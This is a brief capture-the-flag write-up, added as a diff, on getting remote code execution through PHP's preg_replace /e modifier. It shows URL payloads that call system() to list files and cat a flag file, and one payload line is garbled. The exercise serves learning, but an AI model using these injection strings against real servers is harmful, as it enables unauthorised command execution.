@@ -1,0 +1,9 @@
+Remote code execution
+In url - /index.php?vector=/Admin/e&amp;replace=system(‘ls -l’)
+Php is vulnerable to something callet preg_replace() so we used it and typed
+ls -l to get into its insides where we found here_we_dont_have_flag, which is
+very suspicious so we used cat command to look into it.
+=/Admin/e&amp;replace=system(ls -l cat here_we_dont_have_flag’)
+Here we found out that there is something in it named flag.txt. so we obviously
+should access it maybe flag is in there.
+=system(‘cat here_we_dont_have_flag/flag.txt’)
